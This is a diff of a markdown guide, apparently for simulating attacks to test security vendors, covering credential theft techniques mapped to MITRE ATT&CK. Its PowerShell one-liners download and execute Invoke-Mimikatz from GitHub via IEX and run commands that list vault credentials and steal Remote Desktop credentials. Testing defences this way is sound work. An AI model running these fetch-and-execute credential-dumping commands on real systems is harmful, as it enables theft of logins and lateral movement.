@@ -64,9 +64,9 @@ https://attack.mitre.org/techniques/T1555/
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "vault::list";`
 
 ### Remote Desktop credentials theft
-Recently was added to Mimikatz, the assumption is that someone is connected the target commputer over the RDP at the moment of theft of those credentials. Perfect to test on servers due to multiple parallel sessions
+Recently was added to Mimikatz, the assumption is that the target commputer connects through RDP to some other computer at the moment of theft of those credentials. 
 
-`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug ts::logonpasswords"`
+`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "ts::mstsc"`
 
 ## OS Credential Dumping: LSASS Memory
 Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.
